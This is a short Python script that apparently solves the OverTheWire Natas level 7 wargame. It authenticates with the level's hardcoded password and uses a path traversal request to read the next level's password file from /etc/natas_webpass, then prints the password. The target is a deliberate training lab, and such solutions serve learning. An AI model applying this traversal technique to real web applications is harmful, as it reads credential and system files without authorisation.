from pwn import *
import requests
import re

username = "natas7"
password = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"
url = "http://{}.natas.labs.overthewire.org".format(username)

log.progress("Getting the natas8 password, Hold on! ")
session = requests.session()
web = session.get(url + "/index.php?page=../../../../etc/natas_webpass/natas8", auth = (username, password)).text
#print(web)
print("The password for natas8 is === " + re.findall("[A-Za-z0-9]{32}", web)[1])